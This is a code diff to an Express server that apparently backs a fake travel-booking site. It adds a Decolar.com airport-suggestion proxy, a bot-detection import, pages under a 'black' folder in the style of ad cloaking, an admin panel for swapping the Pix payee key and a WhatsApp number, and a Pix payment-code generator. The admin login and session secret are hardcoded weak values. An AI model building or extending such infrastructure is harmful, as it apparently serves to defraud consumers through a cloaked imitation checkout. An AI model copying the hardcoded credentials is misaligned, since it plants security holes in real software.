@@ -10,6 +10,8 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 const { isBot } = require("./utils/botDetection");
 const Domain = require("./models/Domain");
+const ZapConfig = require("./models/ZapConfig");
+
 
 const app = express();
 
@@ -40,6 +42,160 @@ app.use("/api/domain", require("./routes/domain.routes"));
     process.exit(1);
   }
 })();
+
+app.get("/api/airport", async (req, res) => {
+  const { airport } = req.query;
+
+  if (!airport) {
+    return res.status(400).json({ error: "please provide the 'airport' parameter in GET" });
+  }
+
+  try {
+    const { data } = await axios.get(
+      `https://www.decolar.com/suggestions?locale=pt_BR&profile=sbox-flights&hint=${encodeURIComponent(airport)}`
+    );
+
+    const results = [];
+
+    if (data?.items) {
+      data.items.forEach(item => {
+        item.items.forEach(local => {
+          results.push(local.display);
+        });
+      });
+    } else {
+      return res.status(502).json({ error: "invalid response or missing items" });
+    }
+
+    res.json(results);
+  } catch (err) {
+    res.status(500).json({ error: "something went wrong", detail: err.message });
+  }
+});
+
+
+app.use(session({
+  secret: 'glitchInfernal666',
+  resave: false,
+  saveUninitialized: true
+}));
+
+// Parse POST body
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+
+// Serve arquivos estáticos do admin (caso tenha CSS ou JS lá)
+app.use('/admin/static', express.static(path.join(__dirname, 'public', 'black', 'admin', 'views', 'login.html')));
+
+// Middleware de autenticação
+function checkAuth(req, res, next) {
+  if (req.session && req.session.auth) return next();
+  return res.redirect('/admin/login');
+}
+
+// Rotas do painel
+app.get('/admin/login', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'black', 'admin', 'views', 'login.html'));
+});
+
+app.post('/admin/login', (req, res) => {
+  const { user, pass } = req.body;
+  if (user === 'admin' && pass === 'senha') {
+    req.session.auth = true;
+    return res.json({ success: true });
+  }
+  return res.json({ error: true });
+});
+
+app.get('/admin/logout', (req, res) => {
+  req.session.destroy(() => res.redirect('/admin/login'));
+});
+
+app.get('/admin/dashboard', checkAuth, (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'black', 'admin', 'views', 'dashboard.html'));
+});
+
+app.get('/admin/get-pix', checkAuth, async (req, res) => {
+  try {
+    const config = await PixConfig.findOne({});
+    if (!config) return res.status(404).json({ pix: '' });
+
+    res.json({ pix: config.pixKey });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: 'Erro ao ler chave Pix' });
+  }
+});
+
+
+const PixConfig = require('./models/PixConfig'); // modelo que vamos criar abaixo
+
+app.post('/admin/save-pix', checkAuth, async (req, res) => {
+  const { pix } = req.body;
+
+  try {
+    // Atualiza ou cria a config
+    await PixConfig.findOneAndUpdate(
+      {},
+      { pixKey: pix, updatedAt: new Date() },
+      { upsert: true, new: true }
+    );
+
+    res.json({ message: 'Chave Pix salva com sucesso (Mongo).' });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: 'Erro ao salvar chave no MongoDB' });
+  }
+});
+
+
+
+app.post('/pix/payment/generate', async (req, res) => {
+  try {
+    const price = parseFloat(req.body.price.replace(",", "."));
+    const config = await PixConfig.findOne();
+    if (!config || !config.pixKey) {
+      return res.status(500).json({ error: "Chave Pix não configurada" });
+    }
+
+    const Pix = require("./public/black/checkout/pix/payment/generate.js");
+    const code = Pix.get_code(price, config.pixKey);
+    res.json({ payload: code });
+  } catch (err) {
+    console.error("Erro ao gerar Pix:", err);
+    res.status(500).json({ error: "Erro ao gerar PIX" });
+  }
+});
+
+
+// 🔍 Get número atual
+app.get('/api/zap', async (req, res) => {
+  try {
+    const config = await ZapConfig.findOne();
+    if (!config) return res.json({ numero: '' });
+    res.json({ numero: config.numero });
+  } catch (err) {
+    console.error("Erro ao buscar zap:", err);
+    res.status(500).json({ error: "Erro ao buscar número do WhatsApp" });
+  }
+});
+
+// 💾 Atualiza número (somente autenticado)
+app.post('/admin/save-zap', checkAuth, async (req, res) => {
+  const { numero } = req.body;
+  try {
+    await ZapConfig.findOneAndUpdate(
+      {},
+      { numero, updatedAt: new Date() },
+      { upsert: true, new: true }
+    );
+    res.json({ message: "Número atualizado com sucesso." });
+  } catch (err) {
+    console.error("Erro ao salvar zap:", err);
+    res.status(500).json({ error: "Erro ao salvar número do WhatsApp" });
+  }
+});
+
 
 
 
